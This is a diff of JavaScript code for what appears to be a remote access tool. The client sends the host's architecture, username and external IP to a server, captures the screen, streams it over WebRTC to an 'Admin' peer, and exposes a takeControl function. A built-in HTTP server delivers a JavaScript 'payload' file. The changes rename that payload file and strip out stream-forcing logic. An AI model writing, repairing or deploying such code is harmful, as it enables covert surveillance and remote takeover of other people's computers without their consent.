@@ -111,7 +111,7 @@ function initConnection() {
  arch: os.arch(),
  user: os.userInfo().username,
  ip: getExternalIP(),
- version: '2.0.1'
+ version: '2.0.2'
  }));
 
  startMonitoring();
@@ -144,16 +144,6 @@ function initConnection() {
  captureScreenPureJS();
  } else if (data.type === 'system_log') {
  // Optional
- } else if (data.type === 'capture_ready') {
- log(`[READY] User ${data.id} confirmed they are streaming!`);
- } else if (data.type === 'force_stream') {
- log(`[STREAM] Force stream requested. Re-attaching tracks...`);
- if (peerConnection && localStream) {
- localStream.getVideoTracks().forEach(track => {
- peerConnection.addTrack(track, localStream);
- });
- log(`[STREAM] Tracks re-added.`);
- }
  }
  } catch (e) {
  log(`[WS] Error parsing message: ${e.message}`);
@@ -280,33 +270,17 @@ async function handleJoinRequest(fromId) {
  log("[WEBRTC] Remote stream received!");
  };
 
- // CRITICAL FIX: Wait for gathering to complete before sending Offer
- peerConnection.onicegatheringstatechange = () => {
- if (peerConnection.iceGatheringState === 'complete') {
- log("[SIG] Gathering Complete. Sending Offer...");
- const offer = peerConnection.localDescription;
- safeSend(JSON.stringify({
- type: 'offer',
- targetId: fromId,
- sdp: offer
- }));
- log("[SIG] Offer Sent to Admin");
- }
- };
-
  log("[SIG] Creating Offer");
  const offer = await peerConnection.createOffer();
  await peerConnection.setLocalDescription(offer);
  
- // If gathering was already complete (rare edge case), send it immediately
- if (peerConnection.iceGatheringState === 'complete') {
  safeSend(JSON.stringify({
  type: 'offer',
  targetId: fromId,
  sdp: peerConnection.localDescription
  }));
- log("[SIG] Offer Sent to Admin (Immediate)");
- }
+ 
+ log("[SIG] Offer Sent to Admin");
 }
 
 function handleOffer(sdp, fromId) {
@@ -333,40 +307,15 @@ function handleOffer(sdp, fromId) {
  });
 }
 
-// --- UPDATED ANSWLE HANDLER WITH STREAM FORCING ---
 function handleAnswer(sdp) {
-    log("[SIG] Setting Remote Description (Answer)");
-    peerConnection.setRemoteDescription(new RTCSessionDescription(sdp))
-        .then(() => {
-            log("[WEBRTC] Connection Established!");
-            
-            // CRITICAL FIX: Force the stream to start flowing
-            // We check if we have tracks. If not, we force a new capture.
-            const sender = peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
-            
-            if (!sender) {
-                log("[VIDEO] No video track found on sender. Re-attaching stream...");
-                if (localStream) {
-                    localStream.getVideoTracks().forEach(track => {
-                        peerConnection.addTrack(track, localStream);
-                    });
-                    log("[VIDEO] Tracks re-added. Stream should be active.");
-                }
-            } else {
-                log("[VIDEO] Video track is attached. Waiting for media flow...");
-            }
-
-            // Send a confirmation that we are ready
-            safeSend(JSON.stringify({
-                type: 'capture_ready',
-                id: myId,
-                timestamp: Date.now()
-            }));
-            
-        })
-        .catch(err => {
-            log(`[WEBRTC] Error setting answer: ${err.message}`);
-        });
+ log("[SIG] Setting Remote Description (Answer)");
+ peerConnection.setRemoteDescription(new RTCSessionDescription(sdp))
+ .then(() => {
+ log("[WEBRTC] Connection Established!");
+ })
+ .catch(err => {
+ log(`[WEBRTC] Error setting answer: ${err.message}`);
+ });
 }
 
 function handleCandidate(candidate) {
@@ -460,9 +409,9 @@ function takeControl(state) {
 const PORT = process.env.PORT || 3000;
 
 const server = http.createServer((req, res) => {
- if (req.url === '/payload.txt') {
+ if (req.url === '/payload.js') {
  res.writeHead(200, { 'Content-Type': 'application/javascript' });
- res.end(fs.readFileSync(path.join(__dirname, 'payload.txt'), 'utf8'));
+ res.end(fs.readFileSync(path.join(__dirname, 'payload.js'), 'utf8'));
  } 
  else if (req.url === '/' || req.url === '/index.html') {
  const indexPath = path.join(__dirname, 'index.html');
